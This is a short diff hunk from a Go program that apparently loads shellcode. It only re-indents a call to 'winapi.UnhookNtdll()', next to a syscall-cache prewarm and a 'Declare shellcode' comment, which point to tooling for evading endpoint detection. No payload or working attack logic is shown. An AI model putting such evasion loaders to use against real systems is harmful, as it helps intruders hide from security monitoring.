@@ -112,7 +112,7 @@ import (
 
 func main() {
 	// Prewarm syscall cache
-  winapi.UnhookNtdll()
+    winapi.UnhookNtdll()
 	winapi.PrewarmSyscallCache()
 
 	// Declare shellcode
